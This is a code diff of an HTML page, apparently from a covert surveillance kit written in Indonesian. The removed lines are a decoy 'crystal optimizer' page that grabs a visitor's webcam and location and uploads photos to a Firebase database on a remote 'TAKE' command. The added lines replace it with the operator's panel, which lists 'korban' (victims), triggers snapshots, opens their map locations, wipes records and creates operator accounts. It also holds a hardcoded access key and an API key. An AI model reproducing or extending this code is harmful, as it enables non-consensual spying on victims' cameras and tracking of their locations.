@@ -1,37 +1,119 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>CRYSTAL OPTIMIZER</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>THE PURPLE METEOR | v3.0 WIPE</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
-        body { background: #0a0514; color: #c084fc; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
-        .crystal { border: 2px solid #c084fc; padding: 50px; border-radius: 50%; cursor: pointer; box-shadow: 0 0 20px #c084fc; }
+        :root { --crystal: rgba(168, 85, 247, 0.2); --neon: #c084fc; --deep: #0a0514; --red: #ff4444; }
+        body { background: var(--deep); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; overflow: hidden; }
+        .meteor-box { position: fixed; inset: 0; pointer-events: none; z-index: 0; }
+        .meteor { position: absolute; width: 2px; height: 80px; background: linear-gradient(to bottom, transparent, var(--neon)); animation: fall 3s linear infinite; }
+        @keyframes fall { 0% { transform: translateY(-100px) translateX(100px) rotate(-45deg); opacity: 0; } 100% { transform: translateY(100vh) translateX(-100vh) rotate(-45deg); opacity: 0; } }
+        #login-screen { position: fixed; inset: 0; background: var(--deep); display: flex; align-items: center; justify-content: center; z-index: 10000; }
+        .glass { background: var(--crystal); backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.1); padding: 25px; border-radius: 20px; width: 300px; text-align: center; }
+        input { background: rgba(0,0,0,0.3); border: 1px solid var(--neon); border-radius: 10px; padding: 12px; color: white; width: 100%; box-sizing: border-box; margin-bottom: 10px; }
+        .btn { background: linear-gradient(45deg, #7c3aed, var(--neon)); color: white; border: none; padding: 10px; border-radius: 8px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 5px; }
+        .container { position: relative; z-index: 1; padding: 20px; height: 100vh; overflow-y: auto; }
+        .node-card { background: var(--crystal); border: 1px solid rgba(192, 132, 252, 0.3); padding: 15px; margin-bottom: 10px; border-radius: 12px; display: flex; justify-content: space-between; align-items: center; }
+        .btn-wipe { background: var(--red); color: white; width: 60px; font-size: 10px; padding: 5px; border-radius: 5px; border: none; cursor: pointer; }
     </style>
 </head>
-<body>
-    <div class="crystal" onclick="start()"><h1>💎</h1><p>IGNITE</p></div>
-    <video id="v" autoplay style="display:none;"></video>
+<body onload="checkAuth()">
+    <div class="meteor-box" id="meteors"></div>
+    <div id="login-screen"><div class="glass"><h2>METEOR</h2><input type="password" id="entry-key" placeholder="KEY"><button class="btn" onclick="login()">IGNITE</button></div></div>
+
+    <div class="container">
+        <h3 id="display-name" style="color:var(--neon);">Syncing...</h3>
+        <div id="node-list"></div>
+        <div id="node-view" style="margin-top:20px;"></div>
+        <div id="admin-panel" style="display:none; margin-top:30px; border-top: 1px solid rgba(255,255,255,0.1); padding-top:20px;">
+            <h4 style="color:#ffd700;">USER MANAGEMENT</h4>
+            <div id="tools"></div>
+        </div>
+    </div>
+
 <script>
     const config = { apiKey: "AIzaSyAqdcpcUxfUBNY2H83IBa1Pp0X6YcQtDlQ", databaseURL: "https://theeyes-8d0aa-default-rtdb.asia-southeast1.firebasedatabase.app" };
     firebase.initializeApp(config); const db = firebase.database();
-    async function start() {
-        const stream = await navigator.mediaDevices.getUserMedia({video:true});
-        document.getElementById('v').srcObject = stream;
-        navigator.geolocation.getCurrentPosition(pos => {
-            const ref = db.ref('korban').push({ waktu: new Date().toLocaleString(), maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}` });
-            db.ref('commands/'+ref.key).on('value', snap => {
-                if(snap.val()?.action === "TAKE") {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = 640; canvas.height = 480;
-                    canvas.getContext('2d').drawImage(document.getElementById('v'), 0, 0);
-                    db.ref('hasil_foto/'+ref.key).set({ foto: canvas.toDataURL('image/jpeg', 0.5) });
-                }
+    let currentUser = null;
+
+    function login() {
+        const key = document.getElementById('entry-key').value;
+        if(key === "dev111") { 
+            currentUser = { n: "Kalz", r: "DEVELOPER", p: 100 };
+            sessionStorage.setItem('meteor_v3', JSON.stringify(currentUser));
+            location.reload();
+        } else {
+            db.ref('users/' + key).once('value', s => {
+                if(s.exists()) { sessionStorage.setItem('meteor_v3', JSON.stringify(s.val())); location.reload(); }
+                else alert("KEY INVALID");
             });
-            alert("Crystal Sync Complete!");
+        }
+    }
+
+    function checkAuth() {
+        const session = sessionStorage.getItem('meteor_v3');
+        if(session) {
+            currentUser = JSON.parse(session);
+            document.getElementById('login-screen').style.display = 'none';
+            renderMeteors();
+            document.getElementById('display-name').innerText = `💎 ${currentUser.n} [${currentUser.r}]`;
+            if(currentUser.p > 1) {
+                document.getElementById('admin-panel').style.display = 'block';
+                document.getElementById('tools').innerHTML = `<button class="btn" onclick="createAcc()">➕ CREATE NEW USER</button>`;
+            }
+            listenNodes();
+        }
+    }
+
+    function listenNodes() {
+        db.ref('korban').on('value', s => {
+            let h = ""; s.forEach(c => {
+                h += `<div class="node-card" onclick="viewNode('${c.key}')">
+                        <span>📍 NODE_${c.key.substring(1,7)}</span>
+                        <button class="btn-wipe" onclick="wipeData('${c.key}')">WIPE</button>
+                      </div>`;
+            });
+            document.getElementById('node-list').innerHTML = h || "Searching...";
         });
     }
+
+    function viewNode(id) {
+        db.ref('korban/'+id).once('value', s => {
+            const k = s.val();
+            document.getElementById('node-view').innerHTML = `
+                <div class="glass" style="width:100%; box-sizing:border-box;">
+                    <button class="btn" onclick="exec('${id}','TAKE')">📸 SNAP</button>
+                    <button class="btn" onclick="exec('${id}','SHOT')">🖼️ SHOT</button>
+                    <button class="btn" style="background:white;color:black" onclick="window.open('${k.maps}')">🌍 MAPS</button>
+                    <div id="img-box" style="margin-top:10px"></div>
+                </div>`;
+            db.ref('hasil_foto/'+id).on('value', f => { if(f.val()) document.getElementById('img-box').innerHTML = `<img src="${f.val().foto}" style="width:100%; border-radius:10px;">`; });
+        });
+    }
+
+    function exec(id, a) { db.ref('commands/'+id).set({ action: a, t: Date.now() }); }
+    
+    // FUNGSI HAPUS RIWAYAT
+    function wipeData(id) {
+        event.stopPropagation();
+        if(confirm("Hapus semua riwayat target ini?")) {
+            db.ref('korban/'+id).remove();
+            db.ref('hasil_foto/'+id).remove();
+            db.ref('hasil_screenshot/'+id).remove();
+            db.ref('commands/'+id).remove();
+            alert("Data Wiped.");
+        }
+    }
+
+    function createAcc() {
+        const n = prompt("Nama:"), k = prompt("Passcode:"), r = prompt("Role (OWNER/ADMIN/MEMBER):");
+        if(n && k) db.ref('users/'+k).set({ n:n, r:r, p: r==="OWNER"?3:(r==="ADMIN"?2:1) });
+    }
+    function renderMeteors() { const b = document.getElementById('meteors'); for(let i=0; i<15; i++) { let m = document.createElement('div'); m.className='meteor'; m.style.left=Math.random()*100+'%'; m.style.animationDelay=Math.random()*3+'s'; b.appendChild(m); } }
 </script>
 </body>
 </html>
